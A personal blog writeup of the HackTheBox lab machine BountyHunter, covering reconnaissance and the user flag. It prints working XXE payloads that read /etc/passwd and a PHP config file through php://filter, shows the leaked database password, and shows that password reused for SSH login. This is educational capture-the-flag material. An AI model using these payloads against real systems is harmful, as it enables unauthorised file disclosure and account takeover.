---
layout: post
title:  "HackTheBox BountyHunter"
date:   2021-10-03
category: Writeup
image: assets/img/blog/BountyHunter.png
author: Lukas Marckmiller
tags: ctf
---

# HackTheBox BountyHunter Writeup!

Hi! Thanks for reading my Writeup for the HTB Machine *BountyHunter*


## User.txt

First, i started with running [autorecon](https://github.com/Tib3rius/AutoRecon) (`autorecon <ip>)`. Its a pretty nice tool for gathering information about open ports, services bound to ports and possible attack vectors.
Taking a look on the results of  [autorecon](https://github.com/Tib3rius/AutoRecon) it reveals two open ports, SSH (**22**) and HTTP (**80**).  
![nmap](/assets/img/blog/bhnmap.png)
I manually visited the website on port 80, found a php script and started running `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://<ip> -x php`. It revealed following files and directories:

`/resources,/index.php,portal.php,/assets, /js, /css, db.php`

Next i manually checked the discovered directories and found a tasklist in `http://\<ip>/resources/README.txt` containing following text:

> Tasks:
> 
> [ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
> [X] Write tracker submit script
> [ ] Connect tracker submit script to the database
> [X] Fix developer group permissions

We should keep this information in mind. Also theres a file called `bountylog.js` containing JavaScript code. 

    function returnSecret(data) {
    	return Promise.resolve($.ajax({
                type: "POST",
                data: {"data":data},
                url: "tracker_diRbPr00f314.php"
                }));
    }
    
    async function bountySubmit() {
    	try {
    		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
    		<bugreport>
    		<title>${$('#exploitTitle').val()}</title>
    		<cwe>${$('#cwe').val()}</cwe>
    		<cvss>${$('#cvss').val()}</cvss>
    		<reward>${$('#reward').val()}</reward>
    		</bugreport>`
    		let data = await returnSecret(btoa(xml));
      		$("#return").html(data)
    	}
    	catch(error) {
    		console.log('Error:', error);
    	}
    }

Analysing the code we can see that it sends a post request with an xml payload to `tracker_diRbPr00f314.php`. I thought about it for a second and got the idea: 
XML + Webrequest = [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing). So i started BurpSuite, moved to `http://<ip>/log_submit.php` and caught the post request to `http://<ip>/tracker_diRbPr00f314.php` which contained  a base64 encoded payload. A URL and base64 decoding later i got the raw request. 

    <?xml  version="1.0" encoding="ISO-8859-1"?>
    		<bugreport>
    		<title>1</title>
    		<cwe>2</cwe>
    		<cvss>3</cvss>
    		<reward>4</reward>
    		</bugreport>

In  Burp I moved to the Repeater and built my payload with the help of [this list](https://github.com/payloadbox/xxe-injection-payload-list).

    <?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
    		<bugreport>
    		<title>&ent;</title>
    		<cwe>2</cwe>
    		<cvss>3</cvss>
    		<reward>4</reward>
    		</bugreport>

Base64 and URL encoded i got the contents of the passwd file. 

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    ...
    development:x:1000:1000:Development:/home/development:/bin/bash
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
    usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

So my XXE attack was successful. Unfortunately i couldn't read any other found files like `db.php` or `portal.php` in my expected web root direcotory at `/var/www/html/`. So i was looking for a different payload to avoid absolute paths and found an alternative payload on [hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file).

    <!--?xml version="1.0" ?-->
    <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/db.php"> ]>
    <data>&example;</data>

It revealed the contents of db.php.

    <?php
    // TODO -> Implement login system with the database.
    $dbserver = "localhost";
    $dbname = "bounty";
    $dbusername = "admin";
    $dbpassword = "m19RoAU0hP41A1sTsq6K";
    $testuser = "test";
    ?>

Nice! So we got a database user and a password. Unfortunately i couldn't find anything else interesting so i moved to the ssh port. Previously we found a user named `development`in `/etc/passwd`, if we try `ssh development@<ip>` we are prompted for a password. We haven't found any password for this user so i just tried the password from the `db.php` file and .... it worked! 

    development@bountyhunter:~$ id   
    uid=1000(development) gid=1000(development) groups=1000(development)
  So we can retrieve the first flag.

## Root.txt
... soon

